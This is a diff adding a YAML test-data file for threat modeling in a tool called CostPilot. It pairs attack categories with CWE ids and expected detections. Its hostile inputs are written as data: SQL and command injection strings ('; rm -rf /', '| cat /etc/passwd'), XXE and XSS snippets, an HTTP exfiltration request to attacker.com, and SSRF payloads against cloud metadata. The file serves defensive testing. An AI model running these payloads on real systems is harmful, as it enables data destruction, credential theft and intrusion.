@@ -1,0 +1,287 @@
+# CostPilot Security Testing: Threat Modeling
+# Test data for threat modeling and attack vector analysis
+
+# Injection attacks
+sql_injection:
+  metadata:
+    test_case: "sql_injection"
+    description: "SQL injection through malformed input"
+    threat_category: "injection_attacks"
+    severity: "critical"
+    cwe: "CWE-89"
+    expected_behavior: "input_sanitization"
+  attack_vectors:
+    - input: "'; DROP TABLE users; --"
+      injection_point: "resource_name"
+      expected_detection: "sanitization_filter"
+    - input: "1' OR '1'='1"
+      injection_point: "metadata_field"
+      expected_detection: "parameterized_queries"
+    - input: "admin'--"
+      injection_point: "tag_value"
+      expected_detection: "input_validation"
+
+command_injection:
+  metadata:
+    test_case: "command_injection"
+    description: "Command injection through system calls"
+    threat_category: "injection_attacks"
+    severity: "critical"
+    cwe: "CWE-78"
+    expected_behavior: "command_sanitization"
+  attack_vectors:
+    - input: "; rm -rf /"
+      injection_point: "file_path"
+      expected_detection: "path_sanitization"
+    - input: "| cat /etc/passwd"
+      injection_point: "command_argument"
+      expected_detection: "argument_validation"
+    - input: "`whoami`"
+      injection_point: "template_variable"
+      expected_detection: "template_escaping"
+
+xml_injection:
+  metadata:
+    test_case: "xml_injection"
+    description: "XML injection through malformed XML input"
+    threat_category: "injection_attacks"
+    severity: "high"
+    cwe: "CWE-91"
+    expected_behavior: "xml_parser_protection"
+  attack_vectors:
+    - input: "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
+      injection_point: "xml_input"
+      expected_detection: "xxe_prevention"
+    - input: "<script>alert('xss')</script>"
+      injection_point: "metadata_description"
+      expected_detection: "xml_sanitization"
+
+# Privilege escalation
+horizontal_privilege_escalation:
+  metadata:
+    test_case: "horizontal_privilege_escalation"
+    description: "Accessing other users' data at same privilege level"
+    threat_category: "privilege_escalation"
+    severity: "high"
+    cwe: "CWE-284"
+    expected_behavior: "access_control_enforcement"
+  attack_vectors:
+    - scenario: "user_id_manipulation"
+      input: { user_id: "other_user_123" }
+      expected_detection: "user_isolation"
+    - scenario: "session_token_theft"
+      input: { session_token: "stolen_token_abc" }
+      expected_detection: "token_validation"
+
+vertical_privilege_escalation:
+  metadata:
+    test_case: "vertical_privilege_escalation"
+    description: "Elevating privileges to higher access level"
+    threat_category: "privilege_escalation"
+    severity: "critical"
+    cwe: "CWE-269"
+    expected_behavior: "role_based_access_control"
+  attack_vectors:
+    - scenario: "admin_role_assumption"
+      input: { role: "admin", permissions: ["read", "write", "delete", "admin"] }
+      expected_detection: "role_validation"
+    - scenario: "sudo_command_injection"
+      input: { command: "sudo rm -rf /", user_context: "regular_user" }
+      expected_detection: "privilege_check"
+
+# Data exfiltration
+sensitive_data_leakage:
+  metadata:
+    test_case: "sensitive_data_leakage"
+    description: "Unauthorized access to sensitive data"
+    threat_category: "data_exfiltration"
+    severity: "high"
+    cwe: "CWE-200"
+    expected_behavior: "data_classification_protection"
+  attack_vectors:
+    - scenario: "cost_data_exposure"
+      sensitive_data: ["aws_access_key", "database_password", "api_token"]
+      expected_detection: "data_masking"
+    - scenario: "log_data_leakage"
+      sensitive_data: ["user_emails", "ip_addresses", "financial_data"]
+      expected_detection: "log_sanitization"
+
+data_exfiltration_channels:
+  metadata:
+    test_case: "data_exfiltration_channels"
+    description: "Exfiltrating data through various channels"
+    threat_category: "data_exfiltration"
+    severity: "medium"
+    cwe: "CWE-402"
+    expected_behavior: "egress_filtering"
+  attack_vectors:
+    - channel: "dns_exfiltration"
+      payload: "base64_encoded_data.example.com"
+      expected_detection: "dns_filtering"
+    - channel: "http_exfiltration"
+      payload: "POST /api/leak HTTP/1.1\nHost: attacker.com\n\n{stolen_data}"
+      expected_detection: "http_filtering"
+    - channel: "icmp_exfiltration"
+      payload: "ping with data payload"
+      expected_detection: "icmp_filtering"
+
+# Denial of service
+resource_exhaustion_dos:
+  metadata:
+    test_case: "resource_exhaustion_dos"
+    description: "Denial of service through resource exhaustion"
+    threat_category: "denial_of_service"
+    severity: "high"
+    cwe: "CWE-400"
+    expected_behavior: "rate_limiting"
+  attack_vectors:
+    - attack_type: "memory_exhaustion"
+      payload: "extremely_large_json_object"
+      expected_detection: "size_limits"
+    - attack_type: "cpu_exhaustion"
+      payload: "complex_regex_patterns"
+      expected_detection: "computation_limits"
+    - attack_type: "disk_exhaustion"
+      payload: "massive_file_upload"
+      expected_detection: "storage_quotas"
+
+application_layer_dos:
+  metadata:
+    test_case: "application_layer_dos"
+    description: "Application layer denial of service attacks"
+    threat_category: "denial_of_service"
+    severity: "medium"
+    cwe: "CWE-405"
+    expected_behavior: "request_validation"
+  attack_vectors:
+    - attack_type: "slowloris"
+      payload: "slow_http_headers"
+      expected_detection: "timeout_limits"
+    - attack_type: "http_flood"
+      payload: "rapid_http_requests"
+      expected_detection: "rate_limiting"
+    - attack_type: "xml_bomb"
+      payload: "recursive_xml_entities"
+      expected_detection: "xml_parser_limits"
+
+# Supply chain attacks
+dependency_compromise:
+  metadata:
+    test_case: "dependency_compromise"
+    description: "Compromised third-party dependencies"
+    threat_category: "supply_chain_attacks"
+    severity: "critical"
+    cwe: "CWE-350"
+    expected_behavior: "dependency_verification"
+  attack_vectors:
+    - scenario: "malicious_package"
+      compromised_dependency: "cost-calculation-lib"
+      attack_payload: "backdoor_code_execution"
+      expected_detection: "signature_verification"
+    - scenario: "typosquatting"
+      compromised_dependency: "aws-sdk-fake"
+      attack_payload: "credential_theft"
+      expected_detection: "package_name_validation"
+
+build_process_compromise:
+  metadata:
+    test_case: "build_process_compromise"
+    description: "Compromised build pipeline or CI/CD"
+    threat_category: "supply_chain_attacks"
+    severity: "critical"
+    cwe: "CWE-506"
+    expected_behavior: "build_integrity_checks"
+  attack_vectors:
+    - scenario: "ci_cd_compromise"
+      attack_vector: "malicious_ci_script"
+      expected_detection: "pipeline_security"
+    - scenario: "artifact_poisoning"
+      attack_vector: "tampered_release_artifacts"
+      expected_detection: "artifact_signing"
+
+# Authentication bypass
+weak_authentication:
+  metadata:
+    test_case: "weak_authentication"
+    description: "Bypassing weak authentication mechanisms"
+    threat_category: "authentication_bypass"
+    severity: "high"
+    cwe: "CWE-287"
+    expected_behavior: "strong_authentication"
+  attack_vectors:
+    - attack_type: "credential_stuffing"
+      payload: { username: "admin", password: "password123" }
+      expected_detection: "password_complexity"
+    - attack_type: "session_fixation"
+      payload: { session_id: "fixed_session_123" }
+      expected_detection: "session_regeneration"
+
+# Cryptographic failures
+weak_encryption:
+  metadata:
+    test_case: "weak_encryption"
+    description: "Weak or broken cryptographic implementations"
+    threat_category: "cryptographic_failures"
+    severity: "high"
+    cwe: "CWE-327"
+    expected_behavior: "strong_crypto"
+  attack_vectors:
+    - scenario: "weak_cipher"
+      algorithm: "DES"
+      expected_detection: "modern_crypto_algorithms"
+    - scenario: "predictable_keys"
+      key_generation: "weak_random"
+      expected_detection: "cryptographically_secure_random"
+
+# Server-side request forgery
+ssrf_attacks:
+  metadata:
+    test_case: "ssrf_attacks"
+    description: "Server-side request forgery attacks"
+    threat_category: "ssrf"
+    severity: "high"
+    cwe: "CWE-918"
+    expected_behavior: "url_validation"
+  attack_vectors:
+    - attack_type: "internal_service_access"
+      payload: "http://localhost:8080/admin"
+      expected_detection: "localhost_blocking"
+    - attack_type: "metadata_service_access"
+      payload: "http://169.254.169.254/latest/meta-data/"
+      expected_detection: "cloud_metadata_blocking"
+    - attack_type: "file_system_access"
+      payload: "file:///etc/passwd"
+      expected_detection: "protocol_filtering"
+
+# Security misconfiguration
+exposed_sensitive_files:
+  metadata:
+    test_case: "exposed_sensitive_files"
+    description: "Access to sensitive configuration files"
+    threat_category: "security_misconfiguration"
+    severity: "medium"
+    cwe: "CWE-200"
+    expected_behavior: "file_access_control"
+  attack_vectors:
+    - file_path: "/etc/passwd"
+      expected_detection: "file_permissions"
+    - file_path: ".env"
+      expected_detection: "dotfile_protection"
+    - file_path: "config/database.yml"
+      expected_detection: "config_file_protection"
+
+insecure_defaults:
+  metadata:
+    test_case: "insecure_defaults"
+    description: "Insecure default configurations"
+    threat_category: "security_misconfiguration"
+    severity: "medium"
+    cwe: "CWE-276"
+    expected_behavior: "secure_defaults"
+  attack_vectors:
+    - setting: "debug_mode"
+      default_value: true
+      expected_detection: "production_defaults"
+    - setting: "admin_interface"
+      default_value: "exposed"
+      expected_detection: "interface_restriction"
